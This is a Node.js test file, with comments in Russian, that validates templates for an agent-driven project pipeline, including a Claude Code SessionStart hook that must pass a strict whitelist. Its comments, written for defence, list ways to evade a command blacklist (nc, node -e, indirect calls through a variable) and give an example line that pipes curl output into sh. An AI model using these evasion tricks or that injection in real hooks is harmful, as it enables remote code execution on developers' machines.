import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { parseConfig } from '../src/config.mjs';

test('заготовка конфига после подстановки значений валидна', () => {
  const tmpl = readFileSync('templates/common/config.yml.tmpl', 'utf8');
  const filled = tmpl
    .replaceAll('{{NAME}}', 'my-app')
    .replaceAll('{{STACK}}', 'node-ts')
    .replaceAll('{{GOAL}}', 'тестовая цель')
    .replaceAll('{{AUTONOMY}}', 'prod-gate')
    .replaceAll('{{STAGE}}', 'sketch');
  const cfg = parseConfig(filled);
  assert.equal(cfg.project.name, 'my-app');
  assert.equal(cfg.stage, 'sketch');
});

test('заготовка объясняет, что файл ведёт агент', () => {
  const tmpl = readFileSync('templates/common/config.yml.tmpl', 'utf8');
  assert.match(tmpl, /pipeline:reconfigure/);
});

test('пресет node-ts содержит команды проверок и список обязательных', () => {
  const preset = JSON.parse(readFileSync('templates/stacks/node-ts/preset.json', 'utf8'));
  assert.ok(Object.hasOwn(preset.checks, 'test'));
  assert.ok(Object.hasOwn(preset.checks, 'build'));
  assert.ok(Array.isArray(preset.required));
  for (const name of preset.required) {
    assert.ok(Object.hasOwn(preset.checks, name), `required ссылается на ${name}, которого нет в checks`);
  }
});

test('smoke-тест шаблона не зависит от кода проекта', () => {
  const smoke = readFileSync('templates/stacks/node-ts/smoke.test.mjs', 'utf8');
  assert.match(smoke, /node:test/);
  assert.equal(smoke.includes('../src/'), false);
});

test('настройки шаблона объявляют SessionStart-хук', () => {
  const settings = JSON.parse(readFileSync('templates/common/claude-settings.json', 'utf8'));
  const entries = settings.hooks.SessionStart;
  assert.ok(Array.isArray(entries) && entries.length > 0);
  assert.match(JSON.stringify(entries), /pipeline-status\.sh/);
});

// Хук приезжает вместе со скачанным шаблоном и Claude Code исполняет его сам, на SessionStart,
// раньше, чем человек успевает его прочитать. Поэтому нельзя проверять "нет ли в тексте плохих
// слов" — чёрный список (curl, wget, npm install, ...) обходится тривиально командами вроде
// nc, tee, dd, scp, node -e, python3 -c, sed -i или косвенным вызовом через переменную
// (c=curl; $c ...). Единственная надёжная проверка — белый список: у хука есть ровно пять
// разрешённых форм строк, и любая строка, не подходящая ни под одну из них, обязана валить тест.
test('SessionStart-хук построен на белом списке разрешённых конструкций', () => {
  const hook = readFileSync('templates/common/hooks/pipeline-status.sh', 'utf8');
  const lines = hook.split('\n');

  const isShebang = (line) => /^#!/.test(line);
  const isComment = (line) => /^\s*#/.test(line);
  // echo только с буквальным текстом в двойных кавычках: без `"`, `$` и обратных кавычек
  // внутри — это исключает подстановку команд и переменных внутри самой строки echo.
  const isEcho = (line) => /^\s*echo\s+"[^"$`]*"\s*$/.test(line);
  const isElse = (line) => /^\s*else\s*$/.test(line);
  const isFi = (line) => /^\s*fi\s*$/.test(line);
  // Проверка существования файла вида `[ -f <путь> ]; then`, единственная форма условия if.
  // Путь ограничен безопасными символами намеренно: оболочка раскрывает `$(...)`, `` ` `` и `$VAR`
  // в аргументе -f до того, как проверит файл, поэтому `\S+` здесь пропускал бы строку вида
  // `if [ -f $(curl example/x|sh) ]; then` — ровно то, что белый список обязан ловить.
  const isFileExistsCheck = (line) => /^\s*if\s+\[\s+-f\s+[A-Za-z0-9._/-]+\s+\]\s*;\s*then\s*$/.test(line);

  lines.forEach((line, index) => {
    if (line.trim() === '') return;
    const lineNumber = index + 1;
    const allowed = lineNumber === 1
      ? isShebang(line)
      : isComment(line) || isEcho(line) || isFileExistsCheck(line) || isElse(line) || isFi(line);
    assert.ok(
      allowed,
      `строка ${lineNumber} не входит в белый список разрешённых конструкций хука: ${JSON.stringify(line)}`,
    );
  });

  assert.match(hook, /echo/);
});
